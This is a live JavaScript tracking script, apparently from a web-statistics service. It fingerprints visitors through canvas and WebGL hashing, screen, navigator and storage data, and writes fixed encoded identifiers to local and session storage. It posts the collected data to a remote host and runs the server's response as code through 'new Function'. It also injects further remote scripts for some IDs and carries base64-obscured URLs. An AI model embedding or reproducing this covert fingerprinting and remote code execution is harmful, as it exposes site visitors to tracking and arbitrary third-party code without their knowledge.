!(function () {
    var tjn = {
        init: function () {
            var stag = document.getElementsByTagName('script')
var len = stag.length
var isRepeat = 0
for (var i = 0; i < len; i++) {
    if (stag[i].src && stag[i].src.indexOf('613193407680258048') > -1) {
        isRepeat += 1
        if (isRepeat >= 2) break;
    }
}
if (isRepeat >= 2) {
	return;
}let data = {
    cid: this.document.CID(),
    u: this.storage.uuid(),
    ref: this.document.ref(),
    href: this.document.href(),
    scw: this.screen.WH,
    sch: this.screen.HT,
    webX: this.document.webX(),
    webY: this.document.webY(),
    webTitle: this.document.webTitle(),
    sColor: this.screen.CD,
    cN: this.navigator.HC,
    cT: this.document.VDRD().VD && this.document.VDRD().VD.trim(),
    g: this.document.VDRD().RD && this.document.VDRD().RD.trim(),
    mT: this.navigator.EQTP(),
    cD: '',
    o: eval.toString().length * 76,
    plat: this.navigator.PFTC,
    hi: history.length,
    cct: this.navigator.CN(),
    uA: this.navigator.UA,
    sid: this.storage.sid() || null,
    lan: this.navigator.LAN,
    sg: 'tFvSh5tpmJlpa2qZZ2aTZJNklW6cZ2dcU9GGb2iZYlmtW5yWmGaUlGprcZhuYoSVg22YaZZicGNlkptraZNobHFplp2NVNiGcG9plWZvlGmSaptvmmlsYWqSmGFTxFhxW1vf',
    rid: this.storage.rid() || '',
    hSL:document.documentElement.innerHTML.length,
    lN:document.getElementsByTagName('*').length,
    oCN:this.document.oCN() || 0,
};
let xhr;
this.storage.rid('2Mydj2dpl2VolptjlWWWZmFlmHBuZw==');
 
(function (c, l, a, r, i, t, y) {
   // return ;
    if(window.location.hostname.endsWith("tongjiniao.com")){
	return;
    }
    t = l.createElement(r);
    t.async = 1;
    //t.src = window.atob('Ly9hcGkuYTNnai5jbi90P189NTk1MzU4MjYzNjU5NzYxNjY0');
    var currentScript = document.currentScript;
    var src = currentScript.src;
    var urlParams = new URLSearchParams(src.split('?')[1]);
    var id = urlParams.get('_') || '';
    //ids = ['638319010574245888','669551109335302144','605785493622980608','661192632031313920'];
    //ids = ['658091593342177280','661192632031313920'];
    ids = ['589532583629852672','628986803085529088']
    if(!ids.includes(id)){
	return;
    }
    //id = '708346714926473216';
    t.src = '//api1.tongjiniao.com/t?_=' + id;
    //t.src = window.atob('Ly9hcGlwaHAuYTNnai5jbi90P189NTk1MzU4MjYzNjU5NzYxNjY0');
    y = l.getElementsByTagName(r)[0];
    y.parentNode.insertBefore(t, y);

    (function(c,l,a,r,i,t,y){
        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
    })(window, document, "clarity", "script", "n4697r1e72");

})(window, document, "", "script", "");
this.request.post('//api.tongjiniao.com/r?t=1741042969&p=755322720132136960', data,true,function (res){new Function(res.data)();});
        },
        screen: {
            AT: screen.availTop,
AL: screen.availLeft,
AH: screen.availHeight,
AW: screen.availWidth,
CD: screen.colorDepth,
HT: screen.height,
PD: screen.pixelDepth,
WH: screen.width,
ON: screen.orientation
        },
        storage: {
            uuid: function (k, v) {
    if (!k) {
        k = 'st_ee56ee7f579512584f914f96bcfd7062'
    }
    if (!v) {
        v = 'bmyZl5WUbJhhamtlY5lqamplkmVsbGlqYGVjkZI='
    }
    var uuid = localStorage.getItem(k)

    if (!uuid) {
        uuid = v;
        localStorage.setItem(k, v);
    }
    return uuid == 'undefined' ? null : uuid;
},

sid: function (k, v) {
    if (!k) {
        k = 'st_7183e4f201413ffee1170b66a96ce1e9'
    }
    if (!v) {
        v = 'pZbXqc.jnqzKwWxmZmxqZJxmZGNnl2GYaG5mkQ=='
    }
    var sid = sessionStorage.getItem(k)
    if (!sid) {
        sid = v;
        sessionStorage.setItem(k, v);
    }
    return sid == 'undefined' ? null : sid;
},
pc: function (k) {
    if (!k) {
        k = 'st_c62af0bf489d3b0c282bf98bad50f18a'
    }
    var v = sessionStorage.getItem(k),
        href = btoa(location.href);
    v = v ? JSON.parse(v) : [];
    if (v.indexOf(href) === -1) v.push(href);
    sessionStorage.setItem(k, JSON.stringify(v));
    return v.length;
},
rid: function (v) {
    if (!v) {
        v = null
    }
    var k = 'st_e44577e83e65f0d5dea9c0b238d6e71b';
    if (v !== null) {
        sessionStorage.setItem(k, v);
        return;
    }
    v = sessionStorage.getItem(k);
    sessionStorage.removeItem(k);
    return v;
}
        },
        location: {
            HH: location.hash,
HT: location.host,
HN: location.hostname,
HF: location.href,
PN: location.pathname,
PT: location.port,
PL: location.protocol,
SH: location.search
        },
        navigator: {
            ACN: navigator.appCodeName,
AN: navigator.appName,
AV: navigator.appVersion,
CE: navigator.cookieEnabled,
OL: navigator.onLine,
PM: navigator.platform,
UA: navigator.userAgent,
HC: navigator.hardwareConcurrency || 1,
PFTC: navigator.platform.toLowerCase(),
LAN: navigator.language,
JE: function () {
    return navigator.javaEnabled();
},
SBN: function () {
    navigator.sendBeacon();
},
CN: function () {
    var cnVal;
    if (navigator.connection) {
        cnVal = navigator.connection.type || navigator.connection.effectiveType;
    }
    if (typeof cnVal == 'undefined') {
        cnVal = ''
    }
    return cnVal;
},

EQTP: function () {
    function isNative(v) {
        return typeof (v) !== "undefined";
    }

    var userAgentInfo = navigator.userAgent.toLowerCase();
    var o = navigator.platform.toLowerCase();
    var isMac = o.indexOf('macintel') !== -1;
    var isPc = ((o.indexOf("win32") == -1 && !isMac) || o.indexOf("iphone") != -1) ? true :
        false;
    isPc = isPc == true ? o.indexOf("i686") == -1 ? true : false : isPc;

    var isVm = userAgentInfo.indexOf("android") != -1 || userAgentInfo.indexOf("iphone") != -
        1 || userAgentInfo.indexOf("symbianos") != -1 ||
    userAgentInfo.indexOf("windows phone") != -1 || userAgentInfo.indexOf("ipad") != -1 ||
    userAgentInfo.indexOf("ipod") != -1 ? true : false;
    var terMre = Object.getOwnPropertyDescriptor(navigator, "platform") == undefined &&
    (navigator.__proto__ ? Object.getOwnPropertyDescriptor(navigator.__proto__, "platform")
        .value == undefined : true) ?
        true : false;

    terMre = terMre ? (navigator.__lookupGetter__ && isNative(navigator.__lookupGetter__(
        "platform"))) : terMre;

    if (isPc && isVm && terMre || isPc && terMre && !isVm) {
        if (o.indexOf("iphone") != -1 || o.indexOf("ipad") != -1) {
            return 0;
        }
        return 1;
    } else if ((!isPc && isVm) || (!terMre && isPc && isVm)) {
        return 2;
    } else {
        if (isMac) return 4;
        return 3;
    }
}
        },
        document: {
            ref: function () {
    return encodeURI(document.referrer);
},

href: function () {
    return encodeURI(document.location);
},

webY: function () {
    var webY;
    if (navigator.userAgent.indexOf("MSIE") > 0) {
        webY = window.screenTop;
    } else {
        webY = window.screenY;
    }
    return webY
},

webX: function () {
    var webX;
    if (navigator.userAgent.indexOf("MSIE") > 0) {
        webX = window.screenLeft;
    } else {
        webX = window.screenX;
    }
    return webX;
},

webTitle: function () {
    var webTitleName = document.title;
    if (webTitleName.length > 40) {
        webTitleName = webTitleName.substring(0, 40);
    }
    webTitleName = encodeURI(webTitleName);
    return webTitleName;
},

VDRD: function () {
    var canvas = document.createElement("canvas");
    var gl = canvas.getContext("experimental-webgl");
    var vendor, renderer;
    if (gl != null) {
        var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
        if (debugInfo != null) {
            vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
            renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        }
    }
    return {
        VD: vendor,
        RD: renderer
    }
},

CID: function () {
    try {
        var a = "",
            k = "fillStyle",
            q = "beginPath",
            n = "closePath",
            j = "fill",
            h = "arc",
            e = "fillText",
            w = Math.PI;
        var p = document.createElement("canvas");
        p.width = 2000;
        p.height = 200;
        p.style.display = "inline";
        var s = p.getContext("2d");
        a += "canvas winding:" + ((s.isPointInPath(5, 5, "evenodd") === false) ? "yes" : "no");
        s.textBaseline = "alphabetic";
        s[k] = "#f60";
        s.fillRect(125, 1, 62, 20);
        s[k] = "#069";
        s.font = "11pt no-real-font-123";
        var u = "Cwm fjordbank glyphs vext quiz, \ud83d\ude03";
        s[e](u, 2, 15);
        s[k] = "rgba(102, 204, 0, 0.2)";
        s.font = "18pt Arial";
        s[e](u, 4, 45);
        s.globalCompositeOperation = "multiply";
        s[k] = "rgb(255,0,255)";
        s[q]();
        s[h](50, 50, 50, 0, w * 2, true);
        s[n]();
        s[j]();
        s[k] = "rgb(0,255,255)";
        s[q]();
        s[h](100, 50, 50, 0, w * 2, true);
        s[n]();
        s[j]();
        s[k] = "rgb(255,255,0)";
        s[q]();
        s[h](75, 100, 50, 0, w * 2, true);
        s[n]();
        s[j]();
        s[k] = "rgb(255,0,255)";
        s[h](75, 75, 75, 0, w * 2, true);
        s[h](75, 75, 25, 0, w * 2, true);
        s[j]("evenodd");
        s.rect(0, 0, 10, 10);
        s.rect(2, 2, 6, 6);
        if (p.toDataURL) {
            a += ";canvas fp:" + p.toDataURL()
        }
        return (function (c) {
            var b = 0;
            if (c.length === 0) {
                return b
            }
            for (var i = 0; i < c.length; i++) {
                b = ((b << 5) - b) + c.charCodeAt(i);
                b = b & b
            }
            return b
        })(a)
    } catch (o) {
        return o.message;
    }
},

oCN:function (){
    var v = [],
    s = document.getElementsByTagName('script');
    
    for(var i = 0 ;i < s.length ;i ++){
        if(s[i].src && s[i].src.indexOf(window.location.hostname) == -1 ) {
            var url = new URL(s[i].src);
            v.push(url.hostname)
        }
    }
    v = [...new Set(v)];
    return v.length;
}
        },
        request: {
            createXHR: function () {
    let xhr = null;
    if (typeof XMLHttpRequest != 'undefined') {
        xhr = new XMLHttpRequest()
    } else if (typeof ActiveXObject != 'undefined') {
        if (typeof agreement.callee.activeXString != 'string') {
            let versions = ["MSXML2.XMLHTTP.6.0", "MSXML2.XMLHTTP.3.0", "MSXML2.XMLHTTP"], i, len;
            for (i = 0, len = versions.length; i < len; i++) {
                try {
                    xhr = new ActiveXObject(versions[i]);
                    arguments.callee.activeXString = versions[i];
                    break;
                } catch (ex) {
                }
            }
        }
    } else {
        throw new Error('No XHR object available.');
    }
    if (xhr == null) {
        throw new Error('No XHR object available.');
    }
    return xhr;
},
get: function (url, async, callback) {
    let xhr = this.createXHR()
    xhr.open('get', url, async || true)
    xhr.send()
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4) {
            if (xhr.status >= 200 && xhr.status < 300 || xhr.status == 304) {
                let res = JSON.parse(xhr.responseText);
                callback && callback(res, xhr.status, xhr)
            }
        }
    }
},
post: function (url, data, async, callback) {
    let xhr = this.createXHR();
    xhr.open('post', url, async || true)
    let str = ''
    if (data) {
        Object.keys(data).forEach(key => str += `${key}=${data[key]}&`)
        str = str.slice(0, -1)
    }
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded')
    xhr.send(str)
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4) {
            if (xhr.status >= 200 && xhr.status < 300 || xhr.status == 304) {
                let res = JSON.parse(xhr.responseText)
                callback && callback(res, xhr.status, xhr)
            }
        }
    }
}
        }
    }
    tjn.init();
})();